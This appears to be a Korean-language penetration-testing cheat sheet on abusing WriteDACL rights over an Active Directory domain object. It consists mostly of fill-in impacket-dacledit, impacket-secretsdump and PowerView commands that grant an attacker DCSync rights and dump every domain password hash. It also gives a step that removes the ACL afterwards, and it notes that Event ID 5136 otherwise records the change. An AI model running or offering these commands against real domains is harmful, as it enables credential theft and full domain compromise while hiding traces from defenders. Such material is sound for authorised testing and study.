# 도메인 대상

도메인 오브젝트에 WriteDACL이 있으면 자신에게 DCSync 권한을 부여해 전체 해시를 덤프할 수 있다. 이 권한은 ACL로 설정되므로 재부팅 후에도 유지된다. 공격 후 ACL 제거를 안 하면 Event ID 5136으로 흔적이 남는다.

```bash
# DCSync 권한 부여 (LDAP 389)
impacket-dacledit <도메인>/<공격자계정>:'<패스워드>' \
  -dc-ip <DC_IP> \
  -action write \
  -rights DCSync \
  -principal <공격자계정> \
  -target-dn 'DC=<도메인>,DC=LOCAL'  # ← 수정

# DCSync 실행 (SMB 445)
impacket-secretsdump <도메인>/<공격자계정>:'<패스워드>'@<DC_IP>

# 공격 후 ACL 제거
impacket-dacledit <도메인>/<공격자계정>:'<패스워드>' \
  -dc-ip <DC_IP> \
  -action remove \
  -rights DCSync \
  -principal <공격자계정> \
  -target-dn 'DC=<도메인>,DC=LOCAL'
```

```powershell
$Cred = New-Object System.Management.Automation.PSCredential(
  '<도메인>\<공격자계정>',
  (ConvertTo-SecureString '<패스워드>' -AsPlainText -Force)  # ← 수정
)
Add-DomainObjectAcl `
  -TargetIdentity "DC=<도메인>,DC=LOCAL" `
  -PrincipalIdentity <공격자계정> `
  -Rights DCSync `
  -Credential $Cred -Verbose
```
